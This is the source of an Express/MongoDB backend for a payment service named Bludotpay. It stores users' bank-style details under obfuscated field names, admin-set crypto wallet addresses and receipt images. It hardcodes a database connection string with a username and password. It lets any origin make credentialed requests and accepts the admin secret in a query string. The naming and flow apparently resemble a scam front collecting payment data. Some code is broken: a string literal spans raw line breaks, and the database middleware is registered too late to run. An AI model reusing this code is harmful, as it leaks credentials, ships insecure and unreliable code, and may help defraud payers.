'use strict';

// Bludotpay backend — production-ready configuration and API service

const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');

const app = express();

const PORT = Number(process.env.PORT) || 3000;

const MONGODB_URI =
  process.env.MONGODB_URI ||
  'mongodb+srv://milanpatel00987_db_user:<Milan2303@bludotpay.qpvowak.mongodb.net/?appName=Bludotpay';

const ADMIN_SECRET = process.env.ADMIN_SECRET;

if (!ADMIN_SECRET) {
  console.warn('ADMIN_SECRET is not set. Admin authentication will reject all requests until the environment variable is configured.');
}

const MAX_JSON_SIZE = '8mb';

/* -------------------------------------------------------
   Middleware
------------------------------------------------------- */

app.use(
  cors({
    origin: true,
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
  })
);

app.use(express.json({ limit: MAX_JSON_SIZE }));
app.use(express.urlencoded({ extended: true, limit: MAX_JSON_SIZE }));

app.use(express.static(path.join(__dirname)));

/* -------------------------------------------------------
   Mongoose Schemas
------------------------------------------------------- */

const systemConfigSchema = new mongoose.Schema(
  {
    dynamicRate: {
      type: Number,
      required: true,
      default: 1
    },

    chainAddressAlpha: {
      type: String,
      required: true,
      default: ''
    },

    chainAddressBeta: {
      type: String,
      required: true,
      default: ''
    },

    supportLine: {
      type: String,
      required: true,
      default: ''
    },

    supportMail: {
      type: String,
      required: true,
      default: ''
    }
  },
  {
    timestamps: true,
    collection: 'SystemConfig'
  }
);

const userLogsSchema = new mongoose.Schema(
  {
    clientName: {
      type: String,
      required: true,
      trim: true,
      maxlength: 200
    },

    assetVolume: {
      type: Number,
      required: true,
      min: 0
    },

    processingMethod: {
      type: String,
      required: true,
      enum: ['Gateway Alpha', 'Gateway Beta']
    },

    fieldData1: {
      type: String,
      default: '',
      maxlength: 2000000
    },

    fieldData2: {
      type: String,
      default: '',
      maxlength: 2000000
    },

    fieldData3: {
      type: String,
      default: '',
      maxlength: 2000000
    },

    timestamp: {
      type: Date,
      default: Date.now
    }
  },
  {
    collection: 'UserLogs'
  }
);

const SystemConfig = mongoose.model('SystemConfig', systemConfigSchema);
const UserLogs = mongoose.model('UserLogs', userLogsSchema);

/* -------------------------------------------------------
   In-memory active configuration cache
------------------------------------------------------- */

let configCache = null;

const DEFAULT_CONFIG = {
  dynamicRate: 1,
  chainAddressAlpha: '',
  chainAddressBeta: '',
  supportLine: '',
  supportMail: ''
};

async function loadSystemConfig() {
  let config = await SystemConfig.findOne().lean();

  if (!config) {
    config = await SystemConfig.create(DEFAULT_CONFIG);
    config = config.toObject();
  }

  configCache = {
    dynamicRate: Number(config.dynamicRate) || 0,
    chainAddressAlpha: String(config.chainAddressAlpha || ''),
    chainAddressBeta: String(config.chainAddressBeta || ''),
    supportLine: String(config.supportLine || ''),
    supportMail: String(config.supportMail || '')
  };

  return configCache;
}

function getCachedConfig() {
  if (!configCache) {
    configCache = { ...DEFAULT_CONFIG };
  }

  return configCache;
}

/* -------------------------------------------------------
   Validation helpers
------------------------------------------------------- */

function cleanString(value, maxLength = 200) {
  if (typeof value !== 'string') {
    return '';
  }

  return value.trim().slice(0, maxLength);
}

function isValidNumber(value) {
  return (
    typeof value === 'number' &&
    Number.isFinite(value) &&
    value >= 0
  );
}

function validateProcessingMethod(value) {
  return value === 'Gateway Alpha' || value === 'Gateway Beta';
}

function validateDataUrl(value) {
  if (!value) {
    return true;
  }

  if (typeof value !== 'string') {
    return false;
  }

  return (
    value.startsWith('data:image/png;base64,') ||
    value.startsWith('data:image/jpeg;base64,') ||
    value.startsWith('data:image/jpg;base64,') ||
    value.startsWith('data:image/webp;base64,') ||
    value.startsWith('data:image/gif;base64,')
  );
}

/* -------------------------------------------------------
   API: Public configuration
------------------------------------------------------- */

app.get('/api/config', async (req, res) => {
  try {
    if (!configCache) {
      await loadSystemConfig();
    }

    res.json({
      success: true,
      config: getCachedConfig()
    });
  } catch (error) {
    console.error('Config read error:', error);

    res.status(500).json({
      success: false,
      message: 'Unable to load system configuration.'
    });
  }
});

/* -------------------------------------------------------
   API: Create UserLog
------------------------------------------------------- */

app.post('/api/logs', async (req, res) => {
  try {
    const {
      clientName,
      assetVolume,
      processingMethod,
      fieldData1,
      fieldData2,
      fieldData3
    } = req.body;

    const cleanClientName = cleanString(clientName, 200);

    if (!cleanClientName) {
      return res.status(400).json({
        success: false,
        message: 'Client name is required.'
      });
    }

    const numericAssetVolume = Number(assetVolume);

    if (!isValidNumber(numericAssetVolume)) {
      return res.status(400).json({
        success: false,
        message: 'Asset volume must be a valid non-negative number.'
      });
    }

    if (!validateProcessingMethod(processingMethod)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid processing method.'
      });
    }

    if (processingMethod === 'Gateway Alpha') {
      if (!cleanString(fieldData1, 200)) {
        return res.status(400).json({
          success: false,
          message: 'Holder is required.'
        });
      }

      if (!cleanString(fieldData2, 200)) {
        return res.status(400).json({
          success: false,
          message: 'Node Number is required.'
        });
      }

      if (!cleanString(fieldData3, 200)) {
        return res.status(400).json({
          success: false,
          message: 'Route Code is required.'
        });
      }
    }

    if (processingMethod === 'Gateway Beta') {
      if (!validateDataUrl(fieldData1)) {
        return res.status(400).json({
          success: false,
          message: 'Gateway Beta attachment must be an image.'
        });
      }
    }

    const log = await UserLogs.create({
      clientName: cleanClientName,
      assetVolume: numericAssetVolume,
      processingMethod,
      fieldData1: cleanString(fieldData1, 2000000),
      fieldData2: cleanString(fieldData2, 2000000),
      fieldData3: cleanString(fieldData3, 2000000),
      timestamp: new Date()
    });

    res.status(201).json({
      success: true,
      message: 'Operation log created.',
      logId: log._id.toString()
    });
  } catch (error) {
    console.error('Log creation error:', error);

    res.status(500).json({
      success: false,
      message: 'Unable to create operation log.'
    });
  }
});

/* -------------------------------------------------------
   API: Finalize operation
------------------------------------------------------- */

app.post('/api/logs/:id/finalize', async (req, res) => {
  try {
    const { id } = req.params;
    const { receiptData } = req.body;

    if (!mongoose.Types.ObjectId.isValid(id)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid log identifier.'
      });
    }

    if (!validateDataUrl(receiptData)) {
      return res.status(400).json({
        success: false,
        message: 'Execution confirmation must be an image.'
      });
    }

    const log = await UserLogs.findById(id);

    if (!log) {
      return res.status(404).json({
        success: false,
        message: 'Operation log was not found.'
      });
    }

    const existingState = log.fieldData3 || '';

    const finalizationState = JSON.stringify({
      state: 'finalized',
      finalizedAt: new Date().toISOString(),
      receiptAttached: Boolean(receiptData),
      receiptData: receiptData || null
    });

    log.fieldData3 =
      existingState +
      '

--- FINALIZATION STATE ---
' +
      finalizationState;

    await log.save();

    res.json({
      success: true,
      message: 'Successfully submitted. Processing takes 30 minutes.'
    });
  } catch (error) {
    console.error('Finalize error:', error);

    res.status(500).json({
      success: false,
      message: 'Unable to finalize operation.'
    });
  }
});

/* -------------------------------------------------------
   Admin authentication
------------------------------------------------------- */

function requireAdmin(req, res, next) {
  const suppliedKey =
    req.headers.authorization?.replace(/^Bearer\s+/i, '') ||
    req.body?.secretKey ||
    req.query?.secretKey;

  if (!suppliedKey || suppliedKey !== ADMIN_SECRET) {
    return res.status(401).json({
      success: false,
      message: 'Unauthorized.'
    });
  }

  next();
}

/* -------------------------------------------------------
   API: Admin configuration
------------------------------------------------------- */

app.put('/api/admin/config', requireAdmin, async (req, res) => {
  try {
    const {
      dynamicRate,
      chainAddressAlpha,
      chainAddressBeta,
      supportLine,
      supportMail
    } = req.body;

    const numericRate = Number(dynamicRate);

    if (!Number.isFinite(numericRate) || numericRate < 0) {
      return res.status(400).json({
        success: false,
        message: 'dynamicRate must be a valid non-negative number.'
      });
    }

    const values = {
      dynamicRate: numericRate,
      chainAddressAlpha: cleanString(chainAddressAlpha, 1000),
      chainAddressBeta: cleanString(chainAddressBeta, 1000),
      supportLine: cleanString(supportLine, 300),
      supportMail: cleanString(supportMail, 300)
    };

    let config = await SystemConfig.findOne();

    if (!config) {
      config = new SystemConfig(values);
    } else {
      config.dynamicRate = values.dynamicRate;
      config.chainAddressAlpha = values.chainAddressAlpha;
      config.chainAddressBeta = values.chainAddressBeta;
      config.supportLine = values.supportLine;
      config.supportMail = values.supportMail;
    }

    await config.save();

    configCache = {
      dynamicRate: config.dynamicRate,
      chainAddressAlpha: config.chainAddressAlpha,
      chainAddressBeta: config.chainAddressBeta,
      supportLine: config.supportLine,
      supportMail: config.supportMail
    };

    res.json({
      success: true,
      message: 'System configuration updated.',
      config: configCache
    });
  } catch (error) {
    console.error('Admin config update error:', error);

    res.status(500).json({
      success: false,
      message: 'Unable to update configuration.'
    });
  }
});

/* -------------------------------------------------------
   API: Admin logs
------------------------------------------------------- */

app.get('/api/admin/logs', requireAdmin, async (req, res) => {
  try {
    const logs = await UserLogs.find({})
      .sort({ timestamp: -1 })
      .lean();

    res.json({
      success: true,
      logs
    });
  } catch (error) {
    console.error('Admin logs error:', error);

    res.status(500).json({
      success: false,
      message: 'Unable to load user logs.'
    });
  }
});

/* -------------------------------------------------------
   Health endpoint
------------------------------------------------------- */

app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    database:
      mongoose.connection.readyState === 1
        ? 'connected'
        : 'disconnected',
    timestamp: new Date().toISOString()
  });
});

/* -------------------------------------------------------
   Page routes
------------------------------------------------------- */

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'Admin.html'));
});

/* -------------------------------------------------------
   404 API fallback
------------------------------------------------------- */

app.use('/api', (req, res) => {
  res.status(404).json({
    success: false,
    message: 'API endpoint not found.'
  });
});

/* -------------------------------------------------------
   Global error handler
------------------------------------------------------- */

app.use((error, req, res, next) => {
  console.error('Unhandled server error:', error);

  if (res.headersSent) {
    return next(error);
  }

  res.status(500).json({
    success: false,
    message: 'Internal server error.'
  });
});

/* -------------------------------------------------------
   MongoDB startup & Serverless Middleware
------------------------------------------------------- */

let isConnected = false;

async function connectDatabase() {
  if (isConnected) return;
  try {
    await mongoose.connect(MONGODB_URI, {
      serverSelectionTimeoutMS: 15000,
      maxPoolSize: 10,
      minPoolSize: 1
    });
    isConnected = true;
    console.log('MongoDB connected.');
    await loadSystemConfig();
  } catch (error) {
    console.error('MongoDB connection failed:', error.message);
  }
}

// Global database connection middleware for serverless environment
app.use(async (req, res, next) => {
  await connectDatabase();
  next();
});

// Start server locally if not in Vercel production
if (process.env.NODE_ENV !== 'production') {
  connectDatabase().then(() => {
    app.listen(PORT, () => {
      console.log(`Server running locally on http://localhost:${PORT}`);
    });
  });
}

module.exports = app;
